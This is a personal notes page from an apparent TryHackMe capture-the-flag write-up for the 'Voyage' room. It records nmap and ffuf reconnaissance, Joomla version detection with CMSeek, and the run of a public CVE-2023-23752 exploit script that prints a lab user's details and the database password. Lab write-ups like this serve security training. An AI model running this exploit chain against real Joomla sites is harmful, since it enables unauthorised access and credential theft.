---
title: "Voyage"
kind: topic
tags:
  - tryhackme-rooms
area: "TryHackMe Rooms"
up: "[[TryHackMe Rooms]]"
notion-id: fc6759b92751830e98dc0119bf7409d5
---

# Voyage

In: [[Career]] / [[TryHackMe Rooms]]

```bash
┌──(kali㉿Shieldbyte53)-[~]
└─$ nmap -sC -sV -p- -T4 10.48.176.221
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-14 14:46 IST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 2.48 seconds

┌──(kali㉿Shieldbyte53)-[~]
└─$ nmap -sC -sV -p- -Pn -T4 10.48.176.221
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-14 14:46 IST
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 44.31% done; ETC: 14:46 (0:00:09 remaining)
Nmap scan report for 10.48.176.221
Host is up (0.016s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 85:23:46:bd:cf:7b:ba:3f:bf:87:78:22:57:ed:06:64 (ECDSA)
|_  256 b5:47:1f:e2:4e:19:03:c3:98:41:94:4c:dc:55:e8:c6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Home
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/
| /cache/ /cli/ /components/ /includes/ /installation/
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad:4a:7e:34:01:09:f8:68:d8:f7:dd:b8:57:d4:17:cf (RSA)
|   256 8d:cd:5e:60:35:c8:65:66:3a:c5:5c:2f:ac:62:93:80 (ECDSA)
|_  256 a9:d5:16:b1:5d:4a:4c:94:3f:fd:a9:68:5f:24:ee:79 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.15 seconds
```

```bash
┌──(kali㉿Shieldbyte53)-[~]
└─$ ffuf -u http://10.48.176.221/FUZZ -w /usr/share/wordlists/dirb/big.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.176.221/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1102ms]
administrator           [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 10ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 2216ms]
api                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 9ms]
cache                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 8ms]
cli                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 9ms]
components              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 16ms]
images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 27ms]
includes                [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 15ms]
language                [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 16ms]
layouts                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 16ms]
libraries               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 16ms]
media                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 15ms]
modules                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 13ms]
plugins                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 15ms]
robots.txt              [Status: 200, Size: 764, Words: 78, Lines: 30, Duration: 15ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 26ms]
templates               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 11ms]
tmp                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 18ms]
:: Progress: [20469/20469] :: Job [1/1] :: 2816 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

## Nmap Scan

```bash
┌──(kali㉿Shieldbyte53)-[~]
└─$ nmap  -sS -p- 10.48.146.126 -vvv
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-04 15:59 IST
Initiating Ping Scan at 15:59
Scanning 10.48.146.126 [4 ports]
Completed Ping Scan at 15:59, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:59
Completed Parallel DNS resolution of 1 host. at 15:59, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:59
Scanning 10.48.146.126 [65535 ports]
Discovered open port 22/tcp on 10.48.146.126
Discovered open port 80/tcp on 10.48.146.126
Discovered open port 2222/tcp on 10.48.146.126
Completed SYN Stealth Scan at 15:59, 8.92s elapsed (65535 total ports)
Nmap scan report for 10.48.146.126
Host is up, received echo-reply ttl 62 (0.011s latency).
Scanned at 2026-03-04 15:59:06 IST for 9s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack ttl 62
80/tcp   open  http         syn-ack ttl 62
2222/tcp open  EtherNetIP-1 syn-ack ttl 61

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.22 seconds
           Raw packets sent: 65668 (2.889MB) | Rcvd: 65536 (2.621MB)
```

## Fuzzing Directories

```bash
┌──(kali㉿Shieldbyte53)-[~]
└─$ ffuf -u http://10.48.146.126/FUZZ -w /usr/share/wordlists/dirb/big.txt -r

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.146.126/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 2116ms]
administrator           [Status: 200, Size: 12255, Words: 2028, Lines: 191, Duration: 296ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 2927ms]
cache                   [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 9ms]
cli                     [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 10ms]
components              [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 110ms]
images                  [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 9ms]
includes                [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 9ms]
layouts                 [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 8ms]
libraries               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 10ms]
language                [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 106ms]
media                   [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 54ms]
modules                 [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 13ms]
plugins                 [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 11ms]
robots.txt              [Status: 200, Size: 764, Words: 78, Lines: 30, Duration: 10ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 11ms]
templates               [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 10ms]
tmp                     [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 9ms]
:: Progress: [20469/20469] :: Job [1/1] :: 4081 req/sec :: Duration: [0:00:08] :: Errors: 0 ::

```

## Using CMSeek to find Joomla Version

```bash

 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA

 [+]  Deep Scan Results  [+]

[✔] Target: http://10.48.146.126
[✔] Detected CMS: Joomla
[✔] CMS URL: https://joomla.org
[✔] Joomla Version: 4.2.7
[✔] Readme file: http://10.48.146.126/README.txt
[✔] Admin URL: http://10.48.146.126administrator

[✔] Open directories: 4
[*] Open directory url:
   [>] http://10.48.146.126administrator/templates
   [>] http://10.48.146.126administrator/components
   [>] http://10.48.146.126administrator/modules
   [>] http://10.48.146.126images/banners

[x] Core vulnerability database not found!

 CMSeeK says ~ addio
```

## Exploiting Known Vulnerabilites

```bash

┌──(kali㉿Shieldbyte53)-[~/Testing]
└─$ git clone https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT.git
Cloning into 'CVE-2023-23752-EXPLOIT'...
remote: Enumerating objects: 36, done.
remote: Counting objects: 100% (36/36), done.
remote: Compressing objects: 100% (34/34), done.
remote: Total 36 (delta 11), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (36/36), 165.28 KiB | 1.14 MiB/s, done.
Resolving deltas: 100% (11/11), done.

┌──(kali㉿Shieldbyte53)-[~/Testing]
└─$ ls
codes.txt  CVE-2023-23752-EXPLOIT  CVE-2025-55182-poc  ips.txt  react2shellpoc  test.py

┌──(kali㉿Shieldbyte53)-[~/Testing]
└─$ cd CVE-2023-23752-EXPLOIT

┌──(kali㉿Shieldbyte53)-[~/Testing/CVE-2023-23752-EXPLOIT]
└─$ ls
CVE-2023-23752.py  Old_PoC.png  PoC.png  README.md

┌──(kali㉿Shieldbyte53)-[~/Testing/CVE-2023-23752-EXPLOIT]
└─$ python3 CVE-2023-23752.py -u http://10.48.146.126/
┏┓┓┏┏┓  ┏┓┏┓┏┓┏┓  ┏┓┏┓━┓┏━┏┓
┃ ┃┃┣ ━━┏┛┃┫┏┛ ┫━━┏┛ ┫ ┃┗┓┏┛
┗┛┗┛┗┛  ┗━┗┛┗━┗┛  ┗━┗┛ ╹┗┛┗━
Coded By: K3ysTr0K3R --> Hug me ʕっ•ᴥ•ʔっ
Updated By: muhammedikbalyildiz

[*] Checking if target is vulnerable
[+] Target is vulnerable
[*] Launching exploit against: http://10.48.146.126/
---------------------------------------------------------------------------------------------------------------
[*] Checking if target is vulnerable for usernames at path: /api/index.php/v1/users?public=true
[+] Target is vulnerable for usernames
[+] Gathering user(s) for: http://10.48.146.126/
[+] Name: root
[+] Username: root
[+] Email: mail@tourism.thm
[+] Group: Super Users
---------------------------------------------------------------------------------------------------------------
[*] Checking if target is vulnerable for credentials at path: /api/index.php/v1/config/application?public=true
[+] Target is vulnerable for credentials
[+] Gathering credential(s) for: http://10.48.146.126/
[+] User: root
[+] Password: RootPassword@1234
```
